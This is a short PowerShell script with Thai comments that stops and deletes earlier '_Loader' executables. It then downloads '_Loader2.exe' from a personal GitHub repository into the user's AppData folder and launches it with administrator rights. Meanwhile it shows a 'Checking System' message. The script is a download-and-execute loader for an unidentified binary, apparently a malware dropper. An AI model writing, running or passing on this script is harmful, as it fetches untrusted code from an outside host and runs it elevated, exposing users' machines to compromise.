# 1. ตั้งค่าตำแหน่งไฟล์ใหม่ (Loader2) และเพิ่ม GUID กัน Cache
$url = "https://github.com/lubyralph6-maker/newpower.ps1/raw/main/_Loader2.exe?v=$([guid]::NewGuid())"
$destPath = "$env:APPDATA\_Loader2.exe"

# 2. สั่งปิดโปรแกรมเก่าที่อาจจะรันค้างอยู่ (ถ้ามี)
Stop-Process -Name "_Loader" -ErrorAction SilentlyContinue
Stop-Process -Name "_Loader2" -ErrorAction SilentlyContinue

# 3. ลบไฟล์เก่าทิ้งเพื่อความชัวร์ (ลบทั้งชื่อ Loader และ Loader2)
if (Test-Path "$env:APPDATA\_Loader.exe") { Remove-Item "$env:APPDATA\_Loader.exe" -Force }
if (Test-Path $destPath) { Remove-Item $destPath -Force }

# 4. ดาวน์โหลดตัวใหม่ล่าสุด
try {
    Write-Host "Checking System & Downloading Latest Loader..." -ForegroundColor Cyan
    Invoke-WebRequest -Uri $url -OutFile $destPath
} catch {
    Write-Host "Connection Error!" -ForegroundColor Red
    exit
}

# 5. รันตัวใหม่ขึ้นมา (Loader2)
Start-Process -FilePath $destPath -Verb RunAs
